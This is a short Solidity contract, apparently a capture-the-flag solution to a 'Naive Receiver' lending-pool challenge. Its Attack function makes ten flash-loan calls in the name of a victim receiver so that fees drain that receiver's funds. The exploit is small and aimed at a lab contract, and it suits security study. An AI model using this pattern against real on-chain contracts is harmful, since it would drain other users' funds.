// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool pool;
    address receiver;

    constructor(address payable _poolAddress, address _receiver) {
        pool = NaiveReceiverLenderPool(_poolAddress);
        receiver = _receiver;
    }

    function Attack() public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 100 ether);
        }
    }
}
